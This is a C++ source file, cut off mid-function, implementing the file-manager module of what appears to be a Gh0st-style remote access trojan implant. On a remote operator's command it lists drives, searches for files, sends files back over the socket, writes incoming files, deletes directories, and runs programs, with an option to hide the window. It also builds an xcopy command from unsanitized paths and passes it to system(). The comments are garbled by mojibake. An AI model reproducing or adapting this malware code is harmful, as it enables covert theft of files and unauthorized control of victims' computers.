// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "FileManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// �����������б�, ��ʼ�����ļ�������������߳�
	SendDriveList();
	m_hWorkThread = NULL;
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	StopSearchTheard();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// ��ȡ�ļ��б�
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// ɾ���ļ�
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// ɾ���ļ�
		//printf("ɾ��Ŀ¼ %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_MOVE_DIRECTORY:
		MoveDirectory(lpBuffer + 1,nSize -1);
		SendToken(TOKEN_MOVE_FINISH);
		break;
	case COMMAND_MOVE_FILE:
		MyMoveFile(lpBuffer + 1,nSize -1);
		SendToken(TOKEN_MOVE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // �ϴ��ļ�
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // �ϴ��ļ�
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((char *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((char *)lpBuffer + 1, SW_HIDE);
		break;
	case COMMAND_FILES_SEARCH_START:
		SendSearchFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_FILES_SEARCH_STOP:
		StopSearchTheard();
		SendToken(TOKEN_SEARCH_FILE_FINISH);
		break;
	default:
		break;
	}
}

void CFileManager::FindFileInDir(char* rootDir,char* searchfilename,BOOL bEnabledSubfolder)
{
	WIN32_FIND_DATA fd;   

	char filePathName[256];  
	char tmpPath[256];
	
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));  
	ZeroMemory(filePathName, 256);  
	ZeroMemory(tmpPath, 256);  

	_tcscpy(filePathName, rootDir);  
	
	
	if( filePathName[_tcslen(filePathName) -1] != '\\' )  
	{  
		_tcscat(filePathName, "\\");  
	}  
	_tcscat(filePathName, "*.*");  

	HANDLE hSearch = FindFirstFile(filePathName, &fd);  
	
	do 
	{
		DWORD	dwOffset = 1; // λ��ָ��
		
		_tcscpy(tmpPath, rootDir);  
		if( tmpPath[_tcslen(tmpPath) -1] != '\\' )  
			_tcscat(tmpPath, "\\");  
		
		_tcscat(tmpPath, fd.cFileName);  
		
		if( (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  
			&& _tcscmp(fd.cFileName, ".") && _tcscmp(fd.cFileName, "..") )   
		{  
			if (bEnabledSubfolder)
				FindFileInDir(tmpPath,searchfilename,bEnabledSubfolder);  
		}  
		else if( _tcscmp(fd.cFileName, ".") && _tcscmp(fd.cFileName, "..") )  
		{
			if (_tcsstr(_tcsupr(fd.cFileName),_tcsupr(searchfilename)) > 0)
			{
				LPBYTE	lpBuffer = NULL;

				lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
			
				// �ļ����� 1 �ֽ�
				*(lpBuffer + dwOffset) = fd.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
				dwOffset++;
				
				int nLen  = _tcslen(tmpPath);
				memcpy(lpBuffer + dwOffset, tmpPath, nLen);
				
				dwOffset += nLen;
				*(lpBuffer + dwOffset) = 0;
				dwOffset++;
				
				memcpy(lpBuffer + dwOffset, &fd.nFileSizeHigh,  sizeof(DWORD));
				memcpy(lpBuffer + dwOffset + 4, &fd.nFileSizeLow,  sizeof(DWORD));
				dwOffset += 8;
				
				// ������ʱ�� 8 �ֽ�
				memcpy(lpBuffer + dwOffset, &fd.ftLastWriteTime, sizeof(FILETIME));
				dwOffset += 8;
				
				if (dwOffset >1)
				{
					lpBuffer[0] = TOKEN_SEARCH_FILE_LIST;
					
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
					
					Send(lpBuffer,  LocalSize(lpBuffer));
					
					Sleep(10);
					LocalFree(lpBuffer);
				}
			}
		} 
	} while(FindNextFile(hSearch, &fd) && !bIsStopSearch);
	
	FindClose(hSearch);
}


void WINAPI CFileManager::FindFileThread(LPVOID lparam)
{
	CFileManager *pThis = (CFileManager *)lparam;
	pThis->FindFileInDir(pThis->filesearch.SearchPath,pThis->filesearch.SearchFileName,pThis->filesearch.bEnabledSubfolder);
	pThis->SendToken(TOKEN_SEARCH_FILE_FINISH);
}

void CFileManager::StopSearchTheard()
{
	if (bIsStopSearch)
		return;
	bIsStopSearch = TRUE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CFileManager::SendSearchFilesList(LPCTSTR str)
{
	bIsStopSearch  = FALSE; 
	memcpy(&filesearch, str , sizeof(FILESEARCH));

	m_hWorkThread = MyCreateThread(NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)FindFileThread, 
		(LPVOID)this, 
		0, 
		NULL
		);
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {

        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (_tcslen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        _tcscpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{

	TCHAR	lpSubKey[500];
	//	HKEY	hKey;
	TCHAR	strTemp[MAX_PATH];
	//	LONG	nSize = sizeof(strTemp);
	TCHAR	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	TCHAR	*lpExt = (TCHAR	*)_tcsrchr(lpFile, '.');
	if (!lpExt)
		return false;

	TCHAR strResult[MAX_PATH] = {0}; //������
	if (_tcsrchr(lpExt, ' '))
	{
		int nStrLen = _tcslen(lpExt) - 1 ; //ԭʼ�ַ�������

		for(int i = nStrLen ; i > 0; i--)
		{
			if(lpExt[i] == ' ')
			{
				_tcsncpy(strResult,lpExt, i );
				break;
			}
		}
	}
	else
		_tcscpy(strResult,lpExt);
	
// 	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, strResult, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
// 		return false;
// 	RegQueryValue(hKey, NULL, strTemp, &nSize);
// 	RegCloseKey(hKey);
		  

	if(!ReadRegEx(HKEY_CLASSES_ROOT,strResult,0L,REG_SZ,strTemp,NULL,sizeof(strTemp),0))
		return false;
	
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);

// 	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
// 		return false;
	memset(strTemp, 0, sizeof(strTemp));
	char str[MAX_PATH] = {0};
	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_EXPAND_SZ,str,NULL,sizeof(str),0))
		return false;
// 	nSize = sizeof(strTemp);
// 	RegQueryValue(hKey, NULL, strTemp, &nSize);
// 	RegCloseKey(hKey);

	ExpandEnvironmentStrings(str,strTemp,MAX_PATH);
			
	lpstrCat = _tcsstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = _tcsstr(strTemp, "%1");
	if (lpstrCat == NULL)
	{
		_tcscat(strTemp, " ");
		_tcscat(strTemp, lpFile);
	}
	else
		_tcscpy(lpstrCat, lpFile);
				
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default"; 
	}else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}
	
	CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	return true;
}

//  ���� ���ض˵� �������б�
UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// ǰһ���ֽ�Ϊ���ƣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[1024];
//	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // �������б�
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	DWORD	dwOffset = 0; // λ��ָ��

	typedef BOOL (WINAPI *SHGET )(LPCSTR pszPath,DWORD dwFileAttributes,SHFILEINFOA *psfi,UINT ,UINT); 
	HINSTANCE shell32 = LoadLibrary(_T("shell32.dll"));
	SHGET   mySHGetFileInfo= (SHGET  )GetProcAddress(shell32,"SHGetFileInfoA"); 

	for (dwOffset = 1; *pDrive != '\0'; pDrive += _tcslen(pDrive) + 1)
	{
// 		memset(FileSystem, 0, sizeof(FileSystem));
// 		// �õ��ļ�ϵͳ��Ϣ����С
// 		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		mySHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = _tcslen(sfi.szTypeName) + 1;
//		int	nFileSystemLen = _tcslen(FileSystem) + 1;
		

		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
//		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen;// + nFileSystemLen;
	}

	if(shell32)
		FreeLibrary(shell32);

	return Send((LPBYTE)DriveList, dwOffset);
}

// ���� Զ�� �ļ��б�
UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, "%s\\*.*", lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		_tcslen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (_tcscmp(pszFileName, ".") == 0 || _tcscmp(pszFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� _tcslen(pszFileName) + 1 �ֽ�
		nLen = _tcslen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;


	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				if(!DeleteFile(strFile))
				{
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
					DeleteFile(strFile);
				}
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

//bool CFileManager::MyMoveDirectory(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,DWORD dwOffset ,bool bIsCopy)
// {
// 	WIN32_FIND_DATA	wfd;
// 	char	lpszFilter[MAX_PATH];
// 	
// 	wsprintf(lpszFilter, "%s*.*", lpExistingFileName);
// 	
// 	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
// 	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
// 	{
// 		return FALSE;
// 	}
// 	do
// 	{
// 		if (wfd.cFileName[0] != '.')
// 		{
// 			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
// 			{
// 				printf("���ļ���-----------------------------------\r\n");
// 				char strDirectory[MAX_PATH];
// 				wsprintf(strDirectory, "%s%s\\", lpExistingFileName, wfd.cFileName);
// 				
// 				char strNewDirectory[MAX_PATH];
// 				wsprintf(strNewDirectory, "%s%s", lpNewFileName, strDirectory + dwOffset);
// 				
// 				
// 				printf("�ݹ� %s �ƶ���  %s\r\n",strDirectory,strNewDirectory);
// 				MakeSureDirectoryPathExists(strNewDirectory);
// 			}
// 			else
// 			{
// 				printf("���ļ�\r\n");
// 				char strFile[MAX_PATH];
// 				wsprintf(strFile, "%s%s", lpExistingFileName, wfd.cFileName);
// 				
// 				
// 				char strNewDirectory[MAX_PATH];
// 				wsprintf(strNewDirectory, "%s%s%s", lpNewFileName,lpExistingFileName + dwOffset, wfd.cFileName);
// 				
// 				MakeSureDirectoryPathExists(strNewDirectory);
// 				printf("��%s �ƶ���%s\r\n", strFile ,strNewDirectory );
// 				
// 				if (bIsCopy)
// 				{
// 					CopyFile(strFile,strNewDirectory,TRUE);
// 				}else
// 				{
// 					MoveFile(strFile,strNewDirectory);
// 				}
// 			}
// 		}
// 	} while (FindNextFile(hFind, &wfd));
// 	
// 	FindClose(hFind); // �رղ��Ҿ��
// 
// 	if (!bIsCopy)
// 		DeleteDirectory(lpExistingFileName);
// 		
// 	return TRUE;
// }

bool CFileManager::MoveDirectory(LPBYTE lpBuffer, UINT nSize)
{
	FILEMOVE fileMove;
	memcpy(&fileMove,lpBuffer,nSize);
	
	char CommandLine[1024];
	wsprintf(CommandLine,"xcopy \"%s\" \"%s\" /e /i /y",fileMove.lpExistingFileName,fileMove.lpNewFileName);
	
	system(CommandLine);
	
	HINSTANCE Shlwapi = LoadLibrary("Shlwapi.dll"); 
	
	typedef BOOL (WINAPI *TPathFileExistsA)(LPCSTR);	
	TPathFileExistsA MyPathFileExistsA= (TPathFileExistsA)GetProcAddress(Shlwapi, "PathFileExistsA");
	
	if (!fileMove.bIsCopy && MyPathFileExistsA(fileMove.lpNewFileName))
	{
		DeleteDirectory(fileMove.lpExistingFileName);
	}
	
	if (Shlwapi)
		FreeLibrary(Shlwapi);
		
	return true;
}

bool CFileManager::MyMoveFile(LPBYTE lpBuffer, UINT nSize)
{
	FILEMOVE fileMove;
	memcpy(&fileMove,lpBuffer,nSize);
	if (fileMove.bIsCopy)
	{
		CopyFile(fileMove.lpExistingFileName,fileMove.lpNewFileName,TRUE);
	}
	else
	{
		MoveFile(fileMove.lpExistingFileName,fileMove.lpNewFileName);
	}
	
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	_tcscpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("SendFileSize ERRO CODE : %d",lpszFileName,GetLastError());
		return FALSE;
	}
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);

	// �������ݰ��������ļ�����
	int		nPacketSize = _tcslen(lpszFileName) + 10;

	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, _tcslen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);

	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	int		nRet = 0;

	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// Զ��������������һ��
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	//��һ���ļ������õ�ǰ�Ķ�дλ�� �ƶ�һ�����ļ���ָ��
	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4 ���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = 1024 * 8 - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, 1024 * 8);

	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// ������һ���ļ�
void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		if(!SendFileSize((*it).c_str()))
			UploadNext();
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	// �ж��Ƿ����ļ���
	if (lpBuffer[_tcslen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();

	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[_tcslen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
	{
		return false;
	}
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	return true;
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	_tcscpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// ��ȷ��ȡ�ļ���С�ķ���
	DWORDLONG dwHighBase = MAXDWORD;
	dwHighBase += 1;
	// �����ļ�����
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * dwHighBase) + pFileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// ��ʾ��ʲô
		// ���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// ����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		OutputDebugString("GetFileData ERRO\r\n");
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// �������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// �õ��������ļ��е�ƫ��

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
